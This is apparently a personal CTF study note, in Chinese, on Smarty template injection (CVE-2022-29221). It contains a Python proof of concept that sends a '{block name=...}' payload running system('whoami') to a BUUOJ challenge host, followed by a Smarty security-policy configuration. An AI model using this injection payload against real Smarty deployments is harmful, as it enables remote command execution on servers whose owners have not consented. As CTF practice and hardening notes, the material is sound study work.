tags:: CTF/SSTI/Smarty

- # 打CVE
	- ```python
	  url = "http://e76e32ca-0905-43bd-8b92-bb5a027246b2.node4.buuoj.cn:81/index.php"
	  
	  r = base_post(url, data = {
	      "data": "{block name=\"poc*/system('whoami');/*\"}ABC{/block}"
	  }, cookies = {
	      "login": "114"
	  })
	  print(r.text)
	  ```
- # 施工中
	- smarty安全设置
		- ```php
		  $smarty = new Smarty();
		  $my_security_policy = new Smarty_Security($smarty);
		  $my_security_policy->php_functions = null;
		  $my_security_policy->php_handling = Smarty::PHP_REMOVE;
		  $my_security_policy->php_modifiers = null;
		  $my_security_policy->static_classes = null;
		  $my_security_policy->allow_super_globals = false;
		  $my_security_policy->allow_constants = false;
		  $my_security_policy->allow_php_tag = false;
		  $my_security_policy->streams = null;
		  $my_security_policy->php_modifiers = null;
		  $smarty->enableSecurity($my_security_policy);
		  ```
	- 测试
		- `$smarty`变量仍然可以使用
			- `{$smarty.now}`
	- CVE-2022-29221
	-